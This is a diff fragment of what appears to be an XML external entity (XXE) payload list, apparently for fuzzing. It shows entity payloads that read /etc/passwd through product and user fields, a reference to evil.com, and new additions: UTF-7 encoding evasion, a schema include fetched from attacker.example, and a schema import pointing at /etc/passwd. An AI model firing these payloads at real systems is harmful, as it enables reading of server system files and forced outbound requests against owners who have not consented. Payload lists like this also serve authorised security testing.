@@ -53,3 +53,9 @@ SYSTEM "http://evil.com/xxe"
 # === XXE via Content-Type manipulation ===
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><stockCheck><productId>&xxe;</productId></stockCheck>
 <?xml version="1.0"?><!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd">]><userInfo><firstName>&ent;</firstName></userInfo>
+
+# === UTF-7 evasion and external schema fetches ===
+<?xml version="1.0" encoding="UTF-7"?>+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+<?xml version="1.0" encoding='utf-7' ?><a/>
+<?xml version="1.0"?><xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema"><xs:include schemaLocation="http://attacker.example/x.xsd"/></xs:schema>
+<xsd:import namespace="a" schemaLocation="file:///etc/passwd"/>
